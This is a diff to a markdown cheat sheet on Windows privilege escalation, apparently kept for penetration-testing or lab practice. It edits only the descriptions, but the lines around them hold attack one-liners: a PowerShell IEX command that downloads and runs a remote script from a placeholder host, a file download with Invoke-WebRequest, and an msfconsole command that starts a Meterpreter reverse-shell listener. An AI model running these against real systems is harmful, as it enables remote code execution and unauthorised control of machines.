@@ -16,13 +16,13 @@ A good reference for Windows local priv esc.
 
 ### [](#header-3)Download files
 
-Read and execute a file from a weblink.
+Read and execute a file from a weblink with powershell.
 
 ```
 Powershell IEX(New-Object Net.WebClient).DownloadString('http://IP:PORT/FILENAME')
 ```
 
-Download and output a file.
+Download and output a file from powershell.
 
 ```
 Powershell Invoke-WebRequest -Uri IPNUMMER:PORT/FILNAMN -OutFile FILENAME
@@ -32,7 +32,7 @@ Powershell Invoke-WebRequest -Uri IPNUMMER:PORT/FILNAMN -OutFile FILENAME
 
 ### [](#header-3)Listener in Metasploit
 
-Quick oneliner for setting up a listener in Metasploit for reverse shell for Windows.
+Quick oneliner for setting up a listener in Metasploit for reverse shell for Windows. In this example it's a meterpreter listener.
 
 ```
 sudo msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.10; set lport 4444; set ExitOnSession false; exploit -j"
